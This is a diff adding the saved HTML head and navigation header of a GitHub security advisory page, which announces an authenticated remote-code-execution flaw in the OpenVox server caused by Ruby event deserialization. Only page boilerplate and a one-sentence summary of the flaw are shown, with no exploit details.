@@ -1,0 +1,984 @@
+
+
+<!DOCTYPE html>
+<html
+  lang="en"
+  
+  data-color-mode="auto" data-light-theme="light" data-dark-theme="dark"
+  data-a11y-animated-images="system" data-a11y-link-underlines="true"
+  data-css-features="site_disable_smooth_scrolling"
+  >
+
+
+
+
+  <head>
+    <meta charset="utf-8">
+  <link rel="dns-prefetch" href="https://github.githubassets.com">
+  <link rel="dns-prefetch" href="https://avatars.githubusercontent.com">
+  <link rel="dns-prefetch" href="https://github-cloud.s3.amazonaws.com">
+  <link rel="dns-prefetch" href="https://user-images.githubusercontent.com/">
+  <link rel="preconnect" href="https://github.githubassets.com" crossorigin>
+  <link rel="preconnect" href="https://avatars.githubusercontent.com">
+
+<script type="importmap">{"imports":{"react":"https://github.githubassets.com/assets/react-fa5e2e82e6e0ecc0.js","react-dom":"https://github.githubassets.com/assets/react-dom-c7f52540bb6b77ed.js","react-dom/client":"https://github.githubassets.com/assets/react-dom-client-35b308126995de85.js","react-is":"https://github.githubassets.com/assets/react-is-e0b593954b4706d8.js","react/compiler-runtime":"https://github.githubassets.com/assets/react-compiler-runtime-4610bd6d3de9c049.js","react/jsx-dev-runtime":"https://github.githubassets.com/assets/react-jsx-dev-runtime-ea55d68667d559e5.js","react/jsx-runtime":"https://github.githubassets.com/assets/react-jsx-runtime-4915cb0f5b3aff04.js","scheduler":"https://github.githubassets.com/assets/scheduler-58b860b049ca307c.js"}}</script>
+<meta name="react-profiling" content="0" data-turbo-transient="true" />
+<meta name="react-import-map" content="react,react-dom,react-dom/client,react-dom/profiling,react-is,react/compiler-runtime,react/jsx-dev-runtime,react/jsx-runtime,scheduler@b8488ee2c322" data-turbo-track="reload" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/react-fa5e2e82e6e0ecc0.js" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/react-compiler-runtime-4610bd6d3de9c049.js" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/scheduler-58b860b049ca307c.js" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/react-dom-c7f52540bb6b77ed.js" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/react-dom-client-35b308126995de85.js" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/react-is-e0b593954b4706d8.js" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/react-jsx-runtime-4915cb0f5b3aff04.js" />
+
+  
+
+  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/light-3ee16b3ea60adc77.css" /><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/light_high_contrast-bb77a780db30c175.css" /><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/dark-534def0b30583f22.css" /><link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/dark_high_contrast-0f67518b61ff9e26.css" /><link data-color-theme="light" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light-3ee16b3ea60adc77.css" /><link data-color-theme="light_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_high_contrast-bb77a780db30c175.css" /><link data-color-theme="light_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind-a3fc42605ecb973d.css" /><link data-color-theme="light_colorblind_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_colorblind_high_contrast-a4417ebfed3b3564.css" /><link data-color-theme="light_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_tritanopia-cd0282c71cf6cab4.css" /><link data-color-theme="light_tritanopia_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/light_tritanopia_high_contrast-fd231b6399aee2e1.css" /><link data-color-theme="dark" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark-534def0b30583f22.css" /><link data-color-theme="dark_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_high_contrast-0f67518b61ff9e26.css" /><link data-color-theme="dark_colorblind" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind-ea8fec6ab8fcff79.css" /><link data-color-theme="dark_colorblind_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_colorblind_high_contrast-befeaee2f3868d6c.css" /><link data-color-theme="dark_tritanopia" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_tritanopia-75c9b953d3b12c11.css" /><link data-color-theme="dark_tritanopia_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_tritanopia_high_contrast-69cdeb2c6ce70c0a.css" /><link data-color-theme="dark_dimmed" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed-49fcae0aded7216e.css" /><link data-color-theme="dark_dimmed_high_contrast" crossorigin="anonymous" media="all" rel="stylesheet" data-href="https://github.githubassets.com/assets/dark_dimmed_high_contrast-73b6fab9940cb9b1.css" />
+
+  <style type="text/css">
+    :root {
+      --tab-size-preference: 4;
+    }
+
+    pre, code {
+      tab-size: var(--tab-size-preference);
+    }
+  </style>
+
+    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-primitives-7b6f781f48ff31c6.css" />
+    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-edbffb1843552288.css" />
+    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/global-af40a4a5125988a5.css" />
+    <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/github-f73c7caa132ed70b.css" />
+  <link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/repository-6faa8cb3b0c80e0a.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/advisories-bfb462cde3f6338e.css" />
+
+  
+
+  <script type="application/json" id="client-env">{"locale":"en","featureFlags":["actions_caches_react_view","actions_enable_background_steps","actions_new_hosted_runner_image_select_sizes_and_versions","actions_workflows_react_toggle","agent_author_search_expansion","agent_author_search_expansion_ui_pulls","agent_sessions_ccr_review_effort","ai_resource_search","alternate_user_config_repo","billing_billable_licenses_complete_day","billing_billable_licenses_cost_center_bucket_fix","billing_budget_expiration","billing_cost_center_list_assigned_resources","billing_discount_threshold_notification","billing_shared_compute_usage","browser_stats_fixed_delivery_window","catalyst_lazy_define_indexed","code_quality_enablement_banner_targeting","code_quality_remove_preview","code_view_raf_sticky_lines","codespaces_prebuild_region_target_update","coding_agent_third_party_model_ui","copilot-software-factories","copilot_agent_snippy","copilot_api_agentic_issue_marshal_yaml","copilot_automation_continuous_history","copilot_automation_repo_mcp_servers","copilot_automations_pagination","copilot_base_model_policy_row","copilot_chat_auto_mode_v2","copilot_chat_clear_model_selection_for_default_change","copilot_chat_fusion_auto_tiers","copilot_chat_vision_dotcom_chat_ga_gate","copilot_continue_in_github_mobile","copilot_css_textarea_autosize","copilot_custom_copilots","copilot_custom_copilots_feature_preview","copilot_duplicate_thread","copilot_extensions_removal_on_marketplace","copilot_fix_failed_workflows_all_skus","copilot_hide_hovercard","copilot_immersive_task_hyperlinking","copilot_managed_settings_validation_file_links","copilot_mission_control_agent_merge_fix_ci","copilot_mission_control_agent_merge_resolve_conflicts","copilot_mission_control_automation_grouping","copilot_mission_control_awps_batching","copilot_mission_control_create_pull_request_client_tool","copilot_mission_control_create_repository_client_tool","copilot_mission_control_early_stop","copilot_mission_control_environments_web_kickoff","copilot_mission_control_hide_task_list_counts","copilot_mission_control_messaging_app_dm_steering","copilot_mission_control_needs_attention","copilot_mission_control_pinned_tasks","copilot_mission_control_reasoning_effort","copilot_mission_control_reuse_project_workspace","copilot_mission_control_sandbox_request_image_override","copilot_mission_control_session_client_attribution","copilot_mission_control_task_alive_updates","copilot_mission_control_task_route_preloading","copilot_mission_control_task_sharing","copilot_mission_control_use_api_gateway","copilot_org_policy_page_focus_mode","copilot_policy_ui_refresh","copilot_quick_chat_recent_artifact_sessions","copilot_share_active_subthread","copilot_spaces_ga","copilot_spaces_individual_policies_ga","copilot_swe_agent_authorization_status_ui","copilot_swe_agent_automation_completed_trigger","copilot_swe_agent_automation_failed_trigger","copilot_swe_agent_automation_repository_owned","copilot_swe_agent_automation_resource_scoped_writes","copilot_swe_agent_code_scanning_alert_trigger","copilot_swe_agent_dependabot_alert_trigger","copilot_swe_agent_discussion_comment_trigger","copilot_swe_agent_discussion_opened_trigger","copilot_swe_agent_discussion_updated_trigger","copilot_swe_agent_hide_model_picker_if_only_auto","copilot_swe_agent_issue_assigned_trigger","copilot_swe_agent_issue_closed_trigger","copilot_swe_agent_issue_comment_trigger","copilot_swe_agent_issue_labeled_trigger","copilot_swe_agent_issue_reopened_trigger","copilot_swe_agent_issue_status_changed_trigger","copilot_swe_agent_mcp_permission_gate","copilot_swe_agent_merge_conflict_trigger","copilot_swe_agent_pr_comment_model_picker","copilot_swe_agent_pull_request_assigned_trigger","copilot_swe_agent_pull_request_closed_trigger","copilot_swe_agent_pull_request_comment_trigger","copilot_swe_agent_pull_request_converted_to_draft_trigger","copilot_swe_agent_pull_request_labeled_trigger","copilot_swe_agent_pull_request_merged_trigger","copilot_swe_agent_pull_request_opened_trigger","copilot_swe_agent_pull_request_ready_for_review_trigger","copilot_swe_agent_pull_request_reopened_trigger","copilot_swe_agent_pull_request_review_dismissed_trigger","copilot_swe_agent_pull_request_review_requested_trigger","copilot_swe_agent_pull_request_review_submitted_trigger","copilot_swe_agent_pull_request_review_thread_resolved_trigger","copilot_swe_agent_pull_request_review_thread_unresolved_trigger","copilot_swe_agent_pull_request_synchronize_trigger","copilot_swe_agent_secret_scanning_alert_trigger","copilot_swe_agent_sub_issue_added_trigger","copilot_swe_agent_use_subagents","copilot_task_api_github_rest_style","copilot_task_scoped_alive_channel","copilot_token_based_billing","copilot_user_can_upgrade_plan_field","fgpat_permissions_selector_redesign","glc_code_quality_repo_settings_workflow_config","global_issues_filtered_list_layout","global_nav_context_refresh","home_dashboard_ga","hyperspace_2025_logged_out_batch_1","hyperspace_2025_logged_out_batch_2","hyperspace_2025_logged_out_batch_3","in_product_messaging_datadog_monitoring","ipm_ubb_individual_budget_banner","issue_create_status_header","issue_fields_add_picker","issue_fields_multi_select","issue_inline_avatars","issue_relative_time_micro","issues_hide_closed_sub_issues","issues_lazy_load_comment_box_suggestions","issues_react_chrome_container_query_fix","labels_archiving","labels_archiving_info","landing_pages_ninetailed","lifecycle_label_name_updates","marketing_cookie_consent_banner","marketing_pages_search_explore_provider","memex_live_update_hovercard","memex_mwl_filter_field_delimiter","memex_remove_deprecated_type_issue","merge_queue_restricted_pushers_warning","merge_status_header_feedback","new_batched_queries_hook","octocaptcha_origin_optimization","one_copilot_chat_disable_ahp_pings","one_copilot_chat_disable_eager_resume","one_copilot_chat_owner_split_picker","one_copilot_chat_resume_on_intent","one_copilot_grouped_tool_calls","one_copilot_plan_mode","one_copilot_remember_tool_permissions","one_copilot_simplified_environment_picker","planning_board_agent_task_status","primer_react_blankslate_compact_default","primer_react_css_anchor_positioning","primer_react_merged_forwarded_refs","prs_contextual_comment_controls","prs_copilot_app_open_action","prs_copilot_assignee_session_indicator","prs_css_anchor_positioning","prs_desktop_checkout","prs_mergeability_live_updates_trailing","prs_overview_react_public_preview","prs_overview_review_opinion_colors","pull_request_file_tree_prefetch_on_hover_50ms","pull_request_persister","pull_request_stacks_auto_merge_stack_permission","pull_request_stacks_navigation_shortcuts","pull_request_virtualization_image_estimate","pull_request_virtualization_loader_batching","pull_request_virtualization_scroll_compensation","pull_request_virtualization_scroll_intent","pull_requests_deferred_highlight_fallback","pull_requests_persistent_whitespace_preferences","react_blob_isolate_code_lines","react_blob_ssr_content_visibility","react_data_router_nonblocking_revalidation","react_data_router_tanstack_allowed","react_query_props_with_key","react_sandbox_future_tanstack","repo_app_turbo","repo_issues_sidebar_layout","repos_contributors_limited_default_range","rulesets_actor_list_editor","sample_network_conn_type","scribe_artifacts_api","secret_scanning_public_monitoring_hide_preview_labels","secret_scanning_public_monitoring_hide_validity_coming_soon","see_who_reacted","session_logs_ungroup_reasoning_text","set_sha256_on_repo_creation_form","site_banner_desktop_copilot_app","site_download_options_pixel_mona","site_global_banner_copilot_fusion_usage_2026","site_homepage_refresh_2026","site_landing_pages_stable_canvas_position","speculation_rules_ui_service","suppress_automated_browser_vitals","swp_forms_disable_octocaptcha","trusted_types_policies","trusted_types_worker","turbo_link_eligibility_optimization","ui_service_gate_aware_external_check","ui_service_notification_shelf","update_issue_suggestions","viewscreen_sandbox","warn_inaccessible_attachments","webp_support"],"githubDomain":"https://github.com","copilotApiOverrideUrl":"https://api.githubcopilot.com","cmcApiUrl":"https://api.github.com/cmc_internal/api"}</script>
+<script crossorigin="anonymous" type="module" src="https://github.githubassets.com/assets/high-contrast-cookie-74ae35aa09cc7c63.js"></script>
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/wp-runtime-464d06bc333413f5.js" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/app-runtime-ca25080bcf36dff9.js" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/react-core-8b7eeddfdf69ad86.js" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/86048-f53467c0683118f6.js" />
+<script crossorigin="anonymous" type="module" src="https://github.githubassets.com/assets/core-6bbc7a78e6e7e14e.js" defer="defer"></script>
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/app-runtime.ac0bc39e0315c808.module.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react-css.cba9218ca8d0ccc5.module.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/react-core.e84583716befceda.module.css" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/68764-3617b43b3539e041.js" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/20064-71e5d2b6650beae3.js" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/99674-75ffdd402ca60840.js" />
+<script crossorigin="anonymous" type="module" src="https://github.githubassets.com/assets/advisories-c997bdb27b22bf5c.js" defer="defer"></script>
+  
+
+  <title>Authenticated RCE on OpenVox server via Event Deserialization · Advisory · OpenVoxProject/openvox · GitHub</title>
+
+
+
+  <meta name="route-pattern" content="/:user_id/:repository/security/advisories/:id(.:format)" data-turbo-transient>
+  <meta name="route-controller" content="repos_advisories" data-turbo-transient>
+  <meta name="route-action" content="show" data-turbo-transient>
+  <meta name="fetch-nonce" content="v2:ae8ff6ee-afcc-b4d0-d561-129b4ec7ab44">
+
+    
+  <meta name="current-catalog-service-hash" content="8025d6f2cc71a72e813fbf424d385277e1fd1993701fcc4bad786191fb829e54">
+
+
+  <meta name="request-id" content="8008:356FBF:13822AD:1A0BEEE:6AFFD1C4" data-pjax-transient="true"/><meta name="html-safe-nonce" content="8a80aabeb44c34a04c33af0b754e45bba323b300e24e427543806737fd5499ca" data-pjax-transient="true"/><meta name="visitor-payload" content="eyJyZWZlcnJlciI6IiIsInJlcXVlc3RfaWQiOiI4MDA4OjM1NkZCRjoxMzgyMkFEOjFBMEJFRUU6NkFGRkQxQzQiLCJ2aXNpdG9yX2lkIjoiNDUwODQxNjcwNTU3MTA0OTkyNCIsInJlZ2lvbl9lZGdlIjoiaWFkIiwicmVnaW9uX3JlbmRlciI6ImlhZCJ9" data-pjax-transient="true"/><meta name="visitor-hmac" content="ffeb3830b819c513f6e8763ae78c096ace1201ad0111b0f12093b7e09d5615d3" data-pjax-transient="true"/>
+
+
+    <meta name="hovercard-subject-tag" content="repository:874477649" data-turbo-transient>
+
+
+  <meta name="github-keyboard-shortcuts" content="repository,copilot" data-turbo-transient="true" />
+  
+
+  <meta name="selected-link" value="security" data-turbo-transient>
+  <link rel="assets" href="https://github.githubassets.com/">
+
+    <meta name="google-site-verification" content="Apib7-x98H0j5cPqHWwSMm6dNU4GmODRoqxLiDzdx9I">
+
+<meta name="octolytics-url" content="https://collector.github.com/github/collect" />
+
+
+
+
+
+  <meta name="analytics-location" content="/&lt;user-name&gt;/&lt;repo-name&gt;/repos/advisories/show" data-turbo-transient="true" />
+
+  
+
+
+
+
+    <meta name="user-login" content="">
+
+  
+
+    <meta name="viewport" content="width=device-width">
+
+    
+
+      <meta name="description" content="GitHub is where people build software. More than 225 million people use GitHub to discover, fork, and contribute to over 800 million projects.">
+
+      <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="GitHub">
+
+    <link rel="fluid-icon" href="https://github.com/fluidicon.png" title="GitHub">
+    <meta property="fb:app_id" content="1401488693436528">
+    <meta name="apple-itunes-app" content="app-id=1477376905, app-argument=https://github.com/OpenVoxProject/openvox/security/advisories/GHSA-ffr6-rwpm-p5wq" />
+
+      <meta name="twitter:image" content="https://opengraph.githubassets.com/27e54cb86cc9b6b731b9698b0801ea89016e7093d13b808589845312fcfb46a7/OpenVoxProject/openvox/security/advisories/GHSA-ffr6-rwpm-p5wq" /><meta name="twitter:site" content="@github" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Authenticated RCE on OpenVox server via Event Deserialization" /><meta name="twitter:description" content="### Summary
+
+Authenticated attackers with a OpenVox / Puppet client certificate can cause remote code execution on the OpenVox / Puppet server via a Ruby deserialize vulnerability.
+
+### Details..." />
+  <meta property="og:image" content="https://opengraph.githubassets.com/27e54cb86cc9b6b731b9698b0801ea89016e7093d13b808589845312fcfb46a7/OpenVoxProject/openvox/security/advisories/GHSA-ffr6-rwpm-p5wq" /><meta property="og:image:alt" content="### Summary
+
+Authenticated attackers with a OpenVox / Puppet client certificate can cause remote code execution on the OpenVox / Puppet server via a Ruby deserialize vulnerability.
+
+### Details..." /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="600" /><meta property="og:site_name" content="GitHub" /><meta property="og:type" content="object" /><meta property="og:title" content="Authenticated RCE on OpenVox server via Event Deserialization" /><meta property="og:description" content="### Summary
+
+Authenticated attackers with a OpenVox / Puppet client certificate can cause remote code execution on the OpenVox / Puppet server via a Ruby deserialize vulnerability.
+
+### Details..." />
+  
+
+
+
+      <meta name="hostname" content="github.com">
+
+
+
+        <meta name="expected-hostname" content="github.com">
+
+
+  <meta http-equiv="x-pjax-version" content="b509502d812678890817c6cc50dd323705a8349a3350c27a64038ade44f70d23" data-turbo-track="reload">
+  <meta http-equiv="x-pjax-csp-version" content="adddfd507de4c4b0b130ff1dbf3c31681ba97e7a45dc69da056946fc5370dfd4" data-turbo-track="reload">
+  <meta http-equiv="x-pjax-css-version" content="da37a124316120c46a7ac5f1f3faf1b2eb992aa46a47bf3bb59d2c4f87142b79" data-turbo-track="reload">
+  <meta http-equiv="x-pjax-js-version" content="0a0d8686a27478df474dd7415776a7a080cde8838b3cd92ea7601187572e5729" data-turbo-track="reload">
+
+  <meta name="turbo-cache-control" content="no-preview" data-turbo-transient="">
+
+
+
+    
+
+    <meta name="turbo-body-classes" content="logged-out env-production page-responsive">
+  <meta name="disable-turbo" content="false">
+
+
+  <meta name="browser-stats-url" content="https://api.github.com/_private/browser/stats">
+
+
+  <meta name="browser-errors-url" content="https://api.github.com/_private/browser/errors">
+
+  <meta name="release" content="16a11879678aaf97e2a42c33ee70830aa084fa37" data-turbo-track="reload">
+  <meta name="ui-target" content="full">
+
+  <link rel="mask-icon" href="https://github.githubassets.com/assets/pinned-octocat-093da3e6fa40.svg" color="#000000">
+  <link rel="alternate icon" class="js-site-favicon" type="image/png" href="https://github.githubassets.com/favicons/favicon.png">
+  <link rel="icon" class="js-site-favicon" type="image/svg+xml" href="https://github.githubassets.com/favicons/favicon.svg" data-base-href="https://github.githubassets.com/favicons/favicon">
+
+<meta name="theme-color" content="#1e2327">
+<meta name="color-scheme" content="light dark" />
+
+
+  <link rel="manifest" href="/manifest.json" crossOrigin="use-credentials">
+
+  </head>
+
+  <body class="logged-out env-production page-responsive" style="word-wrap: break-word;" >
+    <div data-turbo-body class="logged-out env-production page-responsive" style="word-wrap: break-word;" >
+      <div id="__primerPortalRoot__" style="z-index: 1000; position: absolute; width: 100%;" data-turbo-permanent></div>
+      
+
+    <div class="position-relative header-wrapper js-header-wrapper ">
+      <a href="#start-of-content" data-skip-target-assigned="false" class="px-2 tmp-py-4 color-bg-accent-emphasis color-fg-on-emphasis show-on-focus js-skip-to-content">Skip to content</a>
+
+      <span data-view-component="true" class="progress-pjax-loader Progress position-fixed width-full">
+    <span style="width: 0%;" data-view-component="true" class="Progress-item progress-pjax-loader-bar left-0 top-0 color-bg-accent-emphasis"></span>
+</span>      
+      <link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/chunk-lazy-react-partial-keyboard-shortcuts-dialog-0193b9769f4d9ff0.js" fetchpriority="low" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/38963.f3102a0fa6967ab4.module.css" />
+
+<react-partial
+  partial-name="keyboard-shortcuts-dialog"
+  data-ssr="false"
+  data-attempted-ssr="false"
+  data-react-profiling="false"
+>
+  
+  <script type="application/json" data-target="react-partial.embeddedData">{"props":{"docsUrl":"https://docs.github.com/get-started/accessibility/keyboard-shortcuts"}}</script>
+  <div data-target="react-partial.reactRoot"></div>
+</react-partial>
+
+
+
+
+
+      
+
+        
+            
+            
+
+                <link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/85486-d8bd5f8aaf4e9c5d.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/4926-aa172cb923bc2488.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/59839-4986f8d3ed688800.js" fetchpriority="low" />
+<link crossorigin="anonymous" rel="modulepreload" href="https://github.githubassets.com/assets/chunk-lazy-react-partial-marketing-header-98a9c8ca7fc67fd7.js" fetchpriority="low" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/primer-react-brand-css.99dddccb73417aaf.module.css" />
+<link crossorigin="anonymous" media="all" rel="stylesheet" href="https://github.githubassets.com/assets/7207.cb1866359f51b091.module.css" />
+
+<react-partial
+  partial-name="marketing-header"
+  data-ssr="true"
+  data-attempted-ssr="true"
+  data-react-profiling="false"
+>
+  
+  <script type="application/json" data-target="react-partial.embeddedData">{"props":{"color_mode":"dark","logged_in":false,"marketing_page":false,"home_path":"/","login_path":"/login?return_to=https%3A%2F%2Fgithub.com%2FOpenVoxProject%2Fopenvox%2Fsecurity%2Fadvisories%2FGHSA-ffr6-rwpm-p5wq","signup_path":"/signup?ref_cta=Sign+up\u0026ref_loc=header+logged+out\u0026ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow\u0026source=header-repo\u0026source_repo=OpenVoxProject%2Fopenvox","signup_enabled":true,"is_signup_controller":false,"show_search_and_nav":true,"hide_search":false,"private_mode_enabled":false,"should_use_dotcom_links":true,"auth_hydro_click":"{\"event_type\":\"authentication.click\",\"payload\":{\"location_in_page\":\"site header menu\",\"repository_id\":null,\"auth_type\":\"SIGN_UP\",\"originating_url\":\"https://github.com/OpenVoxProject/openvox/security/advisories/GHSA-ffr6-rwpm-p5wq\",\"user_id\":null}}","auth_hydro_click_hmac":"f5b1d0dcac5288afe61ca893235b1db38ae7854868c5bda2061c986af0b3a5f9"}}</script>
+  <div data-target="react-partial.reactRoot"><link rel="preload" as="image" href="https://github.githubassets.com/assets/platform-4ce65ae0bf273ce2.png"/><link rel="preload" as="image" href="https://github.githubassets.com/assets/platform-dark-ac89fbf373737ed3.png"/><link rel="preload" as="image" href="https://github.githubassets.com/assets/copilot-e2b89335a66dba00.png"/><link rel="preload" as="image" href="https://github.githubassets.com/assets/copilot-dark-2b28403b6080e898.png"/><link rel="preload" as="image" href="https://github.githubassets.com/assets/changelog-fd687bff072883b0.png"/><link rel="preload" as="image" href="https://github.githubassets.com/assets/changelog-dark-b1c25ae971bd641b.png"/><link rel="preload" as="image" href="https://github.githubassets.com/assets/universe-a98cd54821b27569.png"/><div data-color-mode="dark" data-light-theme="light" data-dark-theme="dark"><header class="root__q6pgdo HeaderMktg header-logged-out fullWidth__R5BAbe" role="banner" data-marketing-header="true" data-color-mode="dark" data-light-theme="light" data-dark-theme="dark"><h2 class="visuallyHidden__TIbnmb">Navigation Menu</h2><button type="button" class="backdrop__rMNFxs" aria-label="Close navigation menu"></button><div class="bar__cF4m1O"><div class="topRow__-dqkhM"><div class="toggleSlot__-ODxSX"><button type="button" class="toggle__kPg75-" aria-label="Toggle navigation" aria-expanded="false"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-three-bars" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M1 2.75A.75.75 0 0 1 1.75 2h12.5a.75.75 0 0 1 0 1.5H1.75A.75.75 0 0 1 1 2.75Zm0 5A.75.75 0 0 1 1.75 7h12.5a.75.75 0 0 1 0 1.5H1.75A.75.75 0 0 1 1 7.75ZM1.75 12h12.5a.75.75 0 0 1 0 1.5H1.75a.75.75 0 0 1 0-1.5Z"></path></svg></button></div><div class="LogoSlot__mHAmXE"><a href="/" aria-label="Homepage" class="logo__bX9RKh" data-analytics-event="{&quot;action&quot;:&quot;homepage&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;logo&quot;,&quot;location&quot;:&quot;header&quot;,&quot;label&quot;:&quot;homepage_link_logo_header&quot;}"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-mark-github" viewBox="0 0 24 24" width="32" height="32" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M10.226 17.284c-2.965-.36-5.054-2.493-5.054-5.256 0-1.123.404-2.336 1.078-3.144-.292-.741-.247-2.314.09-2.965.898-.112 2.111.36 2.83 1.01.853-.269 1.752-.404 2.853-.404 1.1 0 1.999.135 2.807.382.696-.629 1.932-1.1 2.83-.988.315.606.36 2.179.067 2.942.72.854 1.101 2 1.101 3.167 0 2.763-2.089 4.852-5.098 5.234.763.494 1.28 1.572 1.28 2.807v2.336c0 .674.561 1.056 1.235.786 4.066-1.55 7.255-5.615 7.255-10.646C23.5 6.188 18.334 1 11.978 1 5.62 1 .5 6.188.5 12.545c0 4.986 3.167 9.12 7.435 10.669.606.225 1.19-.18 1.19-.786V20.63a2.9 2.9 0 0 1-1.078.224c-1.483 0-2.359-.808-2.987-2.313-.247-.607-.517-.966-1.034-1.033-.27-.023-.359-.135-.359-.27 0-.27.45-.471.898-.471.652 0 1.213.404 1.797 1.235.45.651.921.943 1.483.943.561 0 .92-.202 1.437-.719.382-.381.674-.718.944-.943"></path></svg></a></div><div class="MobileAuthAction__GzTYIn"><a class="Primer_Brand__Button-module__Button___scH9Z Primer_Brand__Button-module__Button--subtle___F7pEE Primer_Brand__Button-module__Button--size-small___zQrEw cta__xkenoh" href="/login?return_to=https%3A%2F%2Fgithub.com%2FOpenVoxProject%2Fopenvox%2Fsecurity%2Fadvisories%2FGHSA-ffr6-rwpm-p5wq" data-analytics-event="{&quot;action&quot;:&quot;sign_in&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;context&quot;:&quot;auth_cta&quot;,&quot;location&quot;:&quot;header&quot;,&quot;label&quot;:&quot;sign_in_link_auth_cta_header&quot;}" data-hydro-click="{&quot;event_type&quot;:&quot;authentication.click&quot;,&quot;payload&quot;:{&quot;location_in_page&quot;:&quot;site header menu&quot;,&quot;repository_id&quot;:null,&quot;auth_type&quot;:&quot;SIGN_UP&quot;,&quot;originating_url&quot;:&quot;https://github.com/OpenVoxProject/openvox/security/advisories/GHSA-ffr6-rwpm-p5wq&quot;,&quot;user_id&quot;:null}}" data-hydro-click-hmac="f5b1d0dcac5288afe61ca893235b1db38ae7854868c5bda2061c986af0b3a5f9"><span class="Primer_Brand__Button-module__Button__text___ED0bX"><span class="Primer_Brand__Text-module__Text___XeGJJ Primer_Brand__Text-module__Text-font--mona-sans___a8XJD Primer_Brand__Text-module__Text--default___GhPh_ Primer_Brand__Text-module__Text--100___B2ueX Primer_Brand__Text-module__Text--weight-medium___qJKf_ Primer_Brand__Button-module__Button--label___qrkyz Primer_Brand__Button-module__Button--label-subtle___8ndWH"><svg data-component="Octicon" aria-hidden="true" focusable="false" class="octicon octicon-person" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" display="inline-block" overflow="visible" style="vertical-align:text-bottom"><path d="M10.561 8.073a6.005 6.005 0 0 1 3.432 5.142.75.75 0 1 1-1.498.07 4.5 4.5 0 0 0-8.99 0 .75.75 0 0 1-1.498-.07 6.004 6.004 0 0 1 3.431-5.142 3.999 3.999 0 1 1 5.123 0ZM10.5 5a2.5 2.5 0 1 0-5 0 2.5 2.5 0 0 0 5 0Z"></path></svg><span class="visually-hidden">Sign in</span></span></span></a></div></div><div class="menu__2EHTkB"><div class="menuWrapper__Vmk5KX"><nav class="Nav__rJ6HZw" aria-label="Global"><ul class="List__Rak7Mk"><li><div 